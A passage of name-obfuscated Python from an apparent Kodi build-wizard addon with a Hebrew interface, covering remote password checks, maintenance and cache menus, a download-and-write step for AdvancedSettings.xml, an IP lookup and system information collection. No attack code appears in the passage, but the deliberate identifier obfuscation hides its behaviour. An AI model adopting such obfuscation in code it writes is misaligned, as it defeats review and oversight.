			OO0O0OOOO00O00OO0 =open (O000OO000OO00OOO0 ,mode ='r');O0O0O0O00OOO00OO0 =OO0O0OOOO00O00OO0 .read ();OO0O0OOOO00O00OO0 .close ()#line:2417
			O0O00OO0OOO00OO00 =wiz .parseDOM (O0O0O0O00OOO00OO0 ,'addon',ret ='name',attrs ={'id':O0O00O00OOOO00OO0 })#line:2418
			OOOO0000000O00O0O =os .path .join (ADDONS ,O0O00O00OOOO00OO0 ,'icon.png')#line:2419
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00OO0OOO00OO00 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOO0000000O00O0O )#line:2420
		except :pass #line:2421
def youtubeMenu (url =None ):#line:2423
	if not YOUTUBEFILE =='http://':#line:2424
		if url ==None :#line:2425
			O0OO0OO00000OOOO0 =wiz .workingURL (YOUTUBEFILE )#line:2426
			O0O0O0OO0OO0O00O0 =uservar .YOUTUBEFILE #line:2427
		else :#line:2428
			O0OO0OO00000OOOO0 =wiz .workingURL (url )#line:2429
			O0O0O0OO0OO0O00O0 =url #line:2430
		if O0OO0OO00000OOOO0 ==True :#line:2431
			O00OO000O0OO0OOOO =wiz .openURL (O0O0O0OO0OO0O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2432
			O0OOOO0OO0OOO0O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO000O0OO0OOOO )#line:2433
			if len (O0OOOO0OO0OOO0O0O )>0 :#line:2434
				for OOOOOOOO000OOO0O0 ,OOO000000OO0O0O00 ,url ,OO0O0O0000O0O000O ,O000O0OO000OO0OO0 ,OOO0OOOOOO0OO0O00 in O0OOOO0OO0OOO0O0O :#line:2435
					if OOO000000OO0O0O00 .lower ()=="yes":#line:2436
						addDir ("[B]%s[/B]"%OOOOOOOO000OOO0O0 ,'youtube',url ,description =OOO0OOOOOO0OO0O00 ,icon =OO0O0O0000O0O000O ,fanart =O000O0OO000OO0OO0 ,themeit =THEME3 )#line:2437
					else :#line:2438
						addFile (OOOOOOOO000OOO0O0 ,'viewVideo',url =url ,description =OOO0OOOOOO0OO0O00 ,icon =OO0O0O0000O0O000O ,fanart =O000O0OO000OO0OO0 ,themeit =THEME2 )#line:2439
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2440
		else :#line:2441
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2442
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2443
			addFile ('%s'%O0OO0OO00000OOOO0 ,'',themeit =THEME3 )#line:2444
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2445
	setView ('files','viewType')#line:2446
def STARTP ():#line:2447
	O0000O0OO0O0OOOO0 =(ADDON .getSetting ("pass"))#line:2448
	if BUILDNAME =="":#line:2449
	 if not NOTIFY =='true':#line:2450
          O00OOO0OO0O00O0OO =wiz .workingURL (NOTIFICATION )#line:2451
	 if not NOTIFY2 =='true':#line:2452
          O00OOO0OO0O00O0OO =wiz .workingURL (NOTIFICATION2 )#line:2453
	 if not NOTIFY3 =='true':#line:2454
          O00OOO0OO0O00O0OO =wiz .workingURL (NOTIFICATION3 )#line:2455
	OO0000O00O0O0OOOO =O0000O0OO0O0OOOO0 #line:2456
	O00OOO0OO0O00O0OO =urllib2 .Request (SPEED )#line:2457
	OO00O0O0000000OOO =urllib2 .urlopen (O00OOO0OO0O00O0OO )#line:2458
	OOO00000O0O000O0O =OO00O0O0000000OOO .readlines ()#line:2460
	OO000OOOOO0O0O0OO =0 #line:2464
	for OO0O0O00O00000000 in OOO00000O0O000O0O :#line:2465
		if OO0O0O00O00000000 .split (' ==')[0 ]==O0000O0OO0O0OOOO0 or OO0O0O00O00000000 .split ()[0 ]==O0000O0OO0O0OOOO0 :#line:2466
			OO000OOOOO0O0O0OO =1 #line:2467
			break #line:2468
	if OO000OOOOO0O0O0OO ==0 :#line:2469
					OOOO000O000000OO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2470
					if OOOO000O000000OO0 :#line:2472
						ADDON .openSettings ()#line:2474
						STARTP ()#line:2475
						sys .exit ()#line:2476
					else :#line:2477
						sys .exit ()#line:2478
	return 'ok'#line:2482
def STARTP2 ():#line:2483
	O0OO00OO0O00O0OOO =(ADDON .getSetting ("user"))#line:2484
	OOO00O000O00OOO00 =(UNAME )#line:2486
	OOO0O0O0OO0OO0OOO =urllib2 .urlopen (OOO00O000O00OOO00 )#line:2487
	O0OO00OOOOOOO000O =OOO0O0O0OO0OO0OOO .readlines ()#line:2488
	O000OO000OO000OOO =0 #line:2489
	for O00O00O0OOOOOOO00 in O0OO00OOOOOOO000O :#line:2492
		if O00O00O0OOOOOOO00 .split (' ==')[0 ]==O0OO00OO0O00O0OOO or O00O00O0OOOOOOO00 .split ()[0 ]==O0OO00OO0O00O0OOO :#line:2493
			O000OO000OO000OOO =1 #line:2494
			break #line:2495
	if O000OO000OO000OOO ==0 :#line:2496
		OO0OO0O00OO000OO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2497
		if OO0OO0O00OO000OO0 :#line:2499
			ADDON .openSettings ()#line:2501
			STARTP2 ()#line:2503
			sys .exit ()#line:2504
		else :#line:2505
			sys .exit ()#line:2506
	return 'ok'#line:2510
def passandpin ():#line:2511
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2512
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2513
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2514
def passandUsername ():#line:2515
	ADDON .openSettings ()#line:2516
def folderback ():#line:2519
    OOOO0000O0O0O00OO =ADDON .getSetting ("path")#line:2520
    if OOOO0000O0O0O00OO :#line:2521
      OOOO0000O0O0O00OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2522
      ADDON .setSetting ("path",OOOO0000O0O0O00OO )#line:2523
def backmyupbuild ():#line:2526
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2530
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2534
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2538
def maintMenu (view =None ):#line:2542
	OO00OOO0OO000OOOO ='[B][COLOR green]ON[/COLOR][/B]';OO0OOO0OOO0O00000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2544
	O0OO00OOOO0000O0O ='true'if AUTOCLEANUP =='true'else 'false'#line:2545
	OO00O0OOOOOO0OOO0 ='true'if AUTOCACHE =='true'else 'false'#line:2546
	OO0OO00000OOO0OO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2547
	O0O00O0O0O00O0000 ='true'if AUTOTHUMBS =='true'else 'false'#line:2548
	O0O0000OO0O0O0OOO ='true'if SHOWMAINT =='true'else 'false'#line:2549
	O00O00O00O00OO00O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2550
	O000OO00OOOO0OO0O ='true'if INCLUDEALL =='true'else 'false'#line:2551
	OOOOO0O0OO0O0OOO0 ='true'if THIRDPARTY =='true'else 'false'#line:2552
	if wiz .Grab_Log (True )==False :O00000OO0O000O000 =0 #line:2553
	else :O00000OO0O000O000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2554
	if wiz .Grab_Log (True ,True )==False :OO00OO0OOO0OOO0OO =0 #line:2555
	else :OO00OO0OOO0OOO0OO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2556
	O00OO00O00OOOOOOO =int (O00000OO0O000O000 )+int (OO00OO0OOO0OOO0OO )#line:2557
	O0O00O0O0OO00OOO0 =str (O00OO00O00OOOOOOO )+' Error(s) Found'if O00OO00O00OOOOOOO >0 else 'None Found'#line:2558
	OO0OOOO0O0O0O0000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2559
	if O000OO00OOOO0OO0O =='true':#line:2560
		OOO000OOOOO000O00 ='true'#line:2561
		O0O00O000O0OOOOOO ='true'#line:2562
		OOO000OOOOOO0000O ='true'#line:2563
		OO00O0OOO000OO000 ='true'#line:2564
		O0O0OOOOO0O00O00O ='true'#line:2565
		O00OOOOO0OO00OOOO ='true'#line:2566
		O0O00OOO0O000000O ='true'#line:2567
		O0OOOOOO00OO0OO0O ='true'#line:2568
	else :#line:2569
		OOO000OOOOO000O00 ='true'if INCLUDEBOB =='true'else 'false'#line:2570
		O0O00O000O0OOOOOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2571
		OOO000OOOOOO0000O ='true'if INCLUDESPECTO =='true'else 'false'#line:2572
		OO00O0OOO000OO000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2573
		O0O0OOOOO0O00O00O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2574
		O00OOOOO0OO00OOOO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2575
		O0O00OOO0O000000O ='true'if INCLUDESALTS =='true'else 'false'#line:2576
		O0OOOOOO00OO0OO0O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2577
	OOO0O00000OO0O0OO =wiz .getSize (PACKAGES )#line:2578
	OO0O0OOO000OOOO00 =wiz .getSize (THUMBS )#line:2579
	O000O00OO00O00O0O =wiz .getCacheSize ()#line:2580
	O00OOO00000OOO0O0 =OOO0O00000OO0O0OO +OO0O0OOO000OOOO00 +O000O00OO00O00O0O #line:2581
	O000OO00000OOOO0O =['Daily','Always','3 Days','Weekly']#line:2582
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2583
	if view =="clean"or SHOWMAINT =='true':#line:2584
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOO00000OOO0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O00OO00O00O0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O00000OO0O0OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0OOO000OOOO00 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2590
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2592
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2593
	if view =="addon"or SHOWMAINT =='false':#line:2594
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2595
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2598
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2600
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2601
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2602
	if view =="misc"or SHOWMAINT =='true':#line:2603
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2604
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('View Errors in Log: %s'%(O0O00O0O0OO00OOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('Clear Wizard Log File%s'%OO0OOOO0O0O0O0000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2612
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2613
	if view =="backup"or SHOWMAINT =='true':#line:2614
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2615
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2617
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2624
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2626
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2627
	if view =="tweaks"or SHOWMAINT =='true':#line:2628
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2629
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2630
		else :#line:2631
			if os .path .exists (ADVANCED ):#line:2632
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2633
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2634
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2635
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2636
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2637
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2641
	addFile ('Show All Maintenance: %s'%O0O0000OO0O0O0OOO .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2642
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2643
	addFile ('Third Party Wizards: %s'%OOOOO0O0OO0O0OOO0 .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2644
	if OOOOO0O0OO0O0OOO0 =='true':#line:2645
		OOO0000O0OOO0OOOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2646
		OO000000000O0OO00 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2647
		OOOO00OO0000O000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2648
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0000O0OOO0OOOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2649
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000000000O0OO00 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO00OO0000O000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2651
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2652
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OO00OOOO0000O0O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2653
	if O0OO00OOOO0000O0O =='true':#line:2654
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O000OO00000OOOO0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2655
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO00O0OOOOOO0OOO0 .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2656
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO0OO00000OOO0OO0 .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2657
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O00O0O0O00O0000 .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2658
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2659
	addFile ('Include Video Cache in Clear Cache: %s'%O00O00O00O00OO00O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2660
	if O00O00O00O00OO00O =='true':#line:2661
		addFile ('--- Include All Video Addons: %s'%O000OO00OOOO0OO0O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2662
		addFile ('--- Include Bob: %s'%OOO000OOOOO000O00 .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addFile ('--- Include Phoenix: %s'%O0O00O000O0OOOOOO .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		addFile ('--- Include Specto: %s'%OOO000OOOOOO0000O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2665
		addFile ('--- Include Exodus: %s'%O0O0OOOOO0O00O00O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2666
		addFile ('--- Include Salts: %s'%O0O00OOO0O000000O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2667
		addFile ('--- Include Salts HD Lite: %s'%O0OOOOOO00OO0OO0O .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2668
		addFile ('--- Include One Channel: %s'%O00OOOOO0OO00OOOO .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2669
		addFile ('--- Include Genesis: %s'%OO00O0OOO000OO000 .replace ('true',OO00OOO0OO000OOOO ).replace ('false',OO0OOO0OOO0O00000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2670
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2671
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2672
	setView ('files','viewType')#line:2673
def advancedWindow (url =None ):#line:2675
	if not ADVANCEDFILE =='http://':#line:2676
		if url ==None :#line:2677
			OO0OOO0O000000O00 =wiz .workingURL (ADVANCEDFILE )#line:2678
			O00O0O0000O00OOO0 =uservar .ADVANCEDFILE #line:2679
		else :#line:2680
			OO0OOO0O000000O00 =wiz .workingURL (url )#line:2681
			O00O0O0000O00OOO0 =url #line:2682
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2683
		if os .path .exists (ADVANCED ):#line:2684
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2685
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2686
		if OO0OOO0O000000O00 ==True :#line:2687
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2688
			O00OO0OOO00OO00OO =wiz .openURL (O00O0O0000O00OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2689
			OO000O0O00OOO0OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO0OOO00OO00OO )#line:2690
			if len (OO000O0O00OOO0OOO )>0 :#line:2691
				for OO00000OOO000O0OO ,O0O0O000O000O0O0O ,url ,OO0OO0OO00OO000OO ,O000O0OO00000OO00 ,OO000000OOO00O0OO in OO000O0O00OOO0OOO :#line:2692
					if O0O0O000O000O0O0O .lower ()=="yes":#line:2693
						addDir ("[B]%s[/B]"%OO00000OOO000O0OO ,'advancedsetting',url ,description =OO000000OOO00O0OO ,icon =OO0OO0OO00OO000OO ,fanart =O000O0OO00000OO00 ,themeit =THEME3 )#line:2694
					else :#line:2695
						addFile (OO00000OOO000O0OO ,'writeadvanced',OO00000OOO000O0OO ,url ,description =OO000000OOO00O0OO ,icon =OO0OO0OO00OO000OO ,fanart =O000O0OO00000OO00 ,themeit =THEME2 )#line:2696
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2697
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OOO0O000000O00 )#line:2698
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2699
def writeAdvanced (O0O000O000OO00000 ,OOOOO0O000O0O0O00 ):#line:2701
	O000O00O0OOOOOOO0 =wiz .workingURL (OOOOO0O000O0O0O00 )#line:2702
	if O000O00O0OOOOOOO0 ==True :#line:2703
		if os .path .exists (ADVANCED ):O000O0OO00O0O0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O000O000OO00000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2704
		else :O000O0OO00O0O0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O000O000OO00000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2705
		if O000O0OO00O0O0OO0 ==1 :#line:2707
			O00000OO0O0O00O0O =wiz .openURL (OOOOO0O000O0O0O00 )#line:2708
			OOO000O000O00O0OO =open (ADVANCED ,'w');#line:2709
			OOO000O000O00O0OO .write (O00000OO0O0O00O0O )#line:2710
			OOO000O000O00O0OO .close ()#line:2711
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2712
			wiz .killxbmc (True )#line:2713
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2714
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O000O00O0OOOOOOO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2715
def viewAdvanced ():#line:2717
	O0O000O0OO0O00OOO =open (ADVANCED )#line:2718
	OO0OOOOOO0O0O0O0O =O0O000O0OO0O00OOO .read ().replace ('\t','    ')#line:2719
	wiz .TextBox (ADDONTITLE ,OO0OOOOOO0O0O0O0O )#line:2720
	O0O000O0OO0O00OOO .close ()#line:2721
def removeAdvanced ():#line:2723
	if os .path .exists (ADVANCED ):#line:2724
		wiz .removeFile (ADVANCED )#line:2725
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2726
def showAutoAdvanced ():#line:2728
	notify .autoConfig ()#line:2729
def getIP ():#line:2731
	OO00O0O000OOOOOOO ='http://whatismyipaddress.com/'#line:2732
	if not wiz .workingURL (OO00O0O000OOOOOOO ):return 'Unknown','Unknown','Unknown'#line:2733
	O0O0O0OOO0OO00000 =wiz .openURL (OO00O0O000OOOOOOO ).replace ('\n','').replace ('\r','')#line:2734
	if not 'Access Denied'in O0O0O0OOO0OO00000 :#line:2735
		OOO0O00OO0OOO0O00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0O0O0OOO0OO00000 )#line:2736
		O00O00O000O0OOO00 =OOO0O00OO0OOO0O00 [0 ]if (len (OOO0O00OO0OOO0O00 )>0 )else 'Unknown'#line:2737
		OO00O00O0O0OO0O00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0O0O0OOO0OO00000 )#line:2738
		O0O00OO00000O0O00 =OO00O00O0O0OO0O00 [0 ]if (len (OO00O00O0O0OO0O00 )>0 )else 'Unknown'#line:2739
		O0OOOO00OO00OOO00 =OO00O00O0O0OO0O00 [1 ]+', '+OO00O00O0O0OO0O00 [2 ]+', '+OO00O00O0O0OO0O00 [3 ]if (len (OO00O00O0O0OO0O00 )>2 )else 'Unknown'#line:2740
		return O00O00O000O0OOO00 ,O0O00OO00000O0O00 ,O0OOOO00OO00OOO00 #line:2741
	else :return 'Unknown','Unknown','Unknown'#line:2742
def systemInfo ():#line:2744
	O0000O0OO0OO0OO0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2758
	OO00OO0000OO0O0OO =[];OO0O0OO00OOOOOO00 =0 #line:2759
